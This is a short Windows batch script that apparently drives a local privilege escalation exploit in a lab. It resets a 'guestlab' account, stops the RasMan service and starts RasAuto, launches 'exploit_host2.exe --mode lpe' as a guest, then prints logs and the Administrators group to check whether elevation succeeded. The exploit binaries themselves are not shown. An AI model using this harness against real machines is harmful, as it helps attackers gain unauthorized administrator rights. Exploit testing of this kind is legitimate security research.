@echo off
setlocal

cd /d C:\Users\Public\Desktop\EXPLOIT

net localgroup Administrators guestlab /delete >nul 2>&1
taskkill /IM exploit_host2.exe /F >nul 2>&1
del /f /q system.txt load.txt group_add.txt squatter.log >nul 2>&1

sc stop RasMan >nul 2>&1
sc start RasAuto >nul 2>&1

launch_guest.exe "C:\Users\Public\Desktop\EXPLOIT\exploit_host2.exe --mode lpe"
ping -n 3 127.0.0.1 >nul
launch_builtin_guest.exe --wait "C:\Users\Public\Desktop\EXPLOIT\signal_event.exe"
ping -n 30 127.0.0.1 >nul

echo [squatter.log]
type squatter.log
echo.
echo [load.txt]
if exist load.txt type load.txt
echo.
echo [group_add.txt]
if exist group_add.txt type group_add.txt
echo.
echo [system.txt]
if exist system.txt type system.txt
echo.
echo [administrators]
net localgroup Administrators
